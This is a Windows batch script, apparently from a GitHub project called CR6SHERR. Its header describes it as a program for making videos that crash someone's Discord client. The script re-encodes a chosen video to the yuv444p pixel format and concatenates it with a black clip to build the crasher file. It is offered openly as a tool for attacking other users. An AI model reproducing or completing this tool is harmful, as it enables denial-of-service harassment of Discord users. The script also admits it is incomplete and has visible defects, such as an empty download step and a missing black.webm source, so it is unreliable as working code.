::  ________/\\\\\\\\\__________________________/\\\\\_______________/\\\___________________________/\\\\\\\\\________/\\\\\\\\\____        
::   _____/\\\////////_______________________/\\\\////_______________\/\\\_________________________/\\\///////\\\____/\\\///////\\\___       
::    ___/\\\/_____________________________/\\\///____________________\/\\\________________________\/\\\_____\/\\\___\/\\\_____\/\\\___      
::     __/\\\______________/\\/\\\\\\\____/\\\\\\\\\\\_____/\\\\\\\\\\_\/\\\_____________/\\\\\\\\__\/\\\\\\\\\\\/____\/\\\\\\\\\\\/____     
::      _\/\\\_____________\/\\\/////\\\__/\\\\///////\\\__\/\\\//////__\/\\\\\\\\\\____/\\\/////\\\_\/\\\//////\\\____\/\\\//////\\\____    
::       _\//\\\____________\/\\\___\///__\/\\\______\//\\\_\/\\\\\\\\\\_\/\\\/////\\\__/\\\\\\\\\\\__\/\\\____\//\\\___\/\\\____\//\\\___   
::        __\///\\\__________\/\\\_________\//\\\______/\\\__\////////\\\_\/\\\___\/\\\_\//\\///////___\/\\\_____\//\\\__\/\\\_____\//\\\__  
::         ____\////\\\\\\\\\_\/\\\__________\///\\\\\\\\\/____/\\\\\\\\\\_\/\\\___\/\\\__\//\\\\\\\\\\_\/\\\______\//\\\_\/\\\______\//\\\_ 
::          _______\/////////__\///_____________\/////////_____\//////////__\///____\///____\//////////__\///________\///__\///________\///__
::           _________________________________________________________________________________________________________________________________
::            ____________________________________|   mgXzyy#0001   |   github.com/mariangXzyy/CR6SHERR   |____________________________________
::  
::     Simple program that makes videos for crashing someone's Discord client. 
::     Please note that the videos may not crash recent Chromium client versions of Discord, but it should do its job on some older versions 
::     if the user has not updated Discord.
::  
::                          /!\ THE PROGRAM IS NOT COMPLETE, YOU CANNOT MODIFY VIDEOS WITH THIS BATCH SCRIPT YET!!
::  
::  
::  



@echo off

:batchprep
    echo [RUN][ LOG ][ BATCHPREP ]	Preparing for proper program usage...
    title "CR6SHERR // BatchPrep in progress..."
    cd %localappdata% && echo [OK.][ LOG ][ BATCHPREP ]	CD ok.
    if exist mgXzyy\temp\ (
    	echo [OK.][ LOG ][ BATCHPREP ]	Temp folder exists, ok.
    ) else (
	    echo [RUN][ LOG ][ BATCHPREP ]	Preparing temp folder.
	    mkdir mgXzyy
    	echo [OK.][ LOG ][ BATCHPREP ]	'OK %localappdata%\mgXzyy\
	    cd mgXzyy
    	mkdir TEMP
	    echo [OK.][ LOG ][ BATCHPREP ]	'OK %localappdata%\mgXzyy\TEMP\
    	echo [OK.][ LOG ][ BATCHPREP ]	Temp folder created, continuing batchprep.
    )
set tempfolder="%localappdata%\mgXzyy\TEMP\" && echo [OK.][ LOG ][ BATCHPREP ]	TEMPFOLDER ok.
echo [CHK][ LOG ][ BATCHPREP ]	Checking if ffmpeg exists at '%localappdata%\mgXzyy\ffmpeg\...
cd %localappdata%\mgXzyy\
if exist ffmpeg\ (
    echo [OK.][ LOG ][ batchDEBUG ] FFMPEG EXISTENCE OK.
    goto batchprep_ffmpegOK
) else (
    goto batchprep_ffmpegNULL
)
:batchprep_ffmpegOK
    echo [OK.][ LOG ][ BATCHPREP ]  FFmpeg was found in %localappdata%\mgXzyy\ffmpeg\.
    set ffmpeg=%localappdata%\mgXzyy\ffmpeg\ffmpeg.exe
    echo [OK.][ LOG ][ batchDEBUG ] 'set ffmpeg=%localappdata%\mgXzyy\ffmpeg\ffmpeg.exe
    echo [OK.][ LOG ][ BATCHPREP ]  BatchPrep has completed. Log is printed above and not saved as text file.

title "CR6SHERR // Discord Crashing Video Creator // mgXzyy#0001"
echo.
echo > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > 
echo.

cls
echo '________/\\\\\\\\\__________________________/\\\\\_______________/\\\___________________________/\\\\\\\\\________/\\\\\\\\\____        
echo ' _____/\\\////////_______________________/\\\\////_______________\/\\\_________________________/\\\///////\\\____/\\\///////\\\___       
echo '  ___/\\\/_____________________________/\\\///____________________\/\\\________________________\/\\\_____\/\\\___\/\\\_____\/\\\___      
echo '   __/\\\______________/\\/\\\\\\\____/\\\\\\\\\\\_____/\\\\\\\\\\_\/\\\_____________/\\\\\\\\__\/\\\\\\\\\\\/____\/\\\\\\\\\\\/____     
echo '    _\/\\\_____________\/\\\/////\\\__/\\\\///////\\\__\/\\\//////__\/\\\\\\\\\\____/\\\/////\\\_\/\\\//////\\\____\/\\\//////\\\____    
echo '     _\//\\\____________\/\\\___\///__\/\\\______\//\\\_\/\\\\\\\\\\_\/\\\/////\\\__/\\\\\\\\\\\__\/\\\____\//\\\___\/\\\____\//\\\___   
echo '      __\///\\\__________\/\\\_________\//\\\______/\\\__\////////\\\_\/\\\___\/\\\_\//\\///////___\/\\\_____\//\\\__\/\\\_____\//\\\__  
echo '       ____\////\\\\\\\\\_\/\\\__________\///\\\\\\\\\/____/\\\\\\\\\\_\/\\\___\/\\\__\//\\\\\\\\\\_\/\\\______\//\\\_\/\\\______\//\\\_ 
echo '        _______\/////////__\///_____________\/////////_____\//////////__\///____\///____\//////////__\///________\///__\///________\///__
echo '         _________________________________________________________________________________________________________________________________
echo '          ____________________________________|   mgXzyy#0001   |   github.com/mariangXzyy/CR6SHERR   |____________________________________
echo.

set /p videoname="[ INPUT ] Enter the video filename > "
set /p crashername="[ OUTPUT ] Enter the crasher name > "
echo [ CR6SHERR ] What file type do you want the crasher video to be?
echo 1 >> WebM
echo 2 >> Mp4
echo 3 >> Mov
echo 4 >> Gif (no audio, no play button!)
set /p crasherfiletype="> "
echo.
if %crasherfiletype%==1 (
    echo [CHK][ LOG ][ PREPARATION ]	Checking if ffmpeg exists...
    
    echo [OK.][ LOG ][ PREPARATION ]	FFmpeg exists.
    echo [CHK][ LOG ][ PREPARATION ]	Checking if video given is valid...
    echo [OK.][ LOG ][ PREPARATION ]	Video given is valid.
    echo [RUN][ LOG ][ PROGRESS ]	Running ffmpeg with arguments `-i %videoname% -pix_fmt yuv444p video.webm`
    ffmpeg -i %videoname% -pix_fmt yuv444p video.webm
    (
    echo file video.webm
    echo file black.webm
    )>"DONOTDELETE.txt"
    %ffmpeg% -f concat -i DONOTDELETE.txt -codec copy %crashername%.webm
    del "DONOTDELETE.txt"
    echo Success.
    set /p confDel=Do you want to delete 
    del "video.webm"
)

:batchprep_ffmpegNULL
	echo [ERR][ LOG ][ BATCHPREP ]	FFMPEG DOES NOT EXIST IN 'APPDATA\LOCAL\MGXZYY.
	set /p confFFMPEGinst="[ Input ] Download FFmpeg? You will need WGET installed. (y/n) > "
    if %confFFMPEGinst%==y (goto batchprep_ffmpegpull)
    echo [OK.][ LOG ][ batchDEBUG ] User did not say yes.
    if %confFFMPEGinst%==n (goto batchprep_fail)
    echo [OK.][ LOG ][ batchDEBUG ] User did not say no. (INVALID INPUT)
    echo [ERR][ LOG ][ CR6SHERR ]   Invalid input.
    goto batchprep_ffmpegNULL

:batchprep_ffmpegpull

:batchprep_fail
    echo.
    echo [ERR][ LOG ][ CR6SHERR ]   Batchprep failed. Log is printed above and not saved as text file.
    echo                            If you get the same errors again and again, do not hesitate to open
    echo                            an issue on https://github.com/mariangXzyy/CR6SHERR/issues.
    echo.
    pause && goto exit


:exit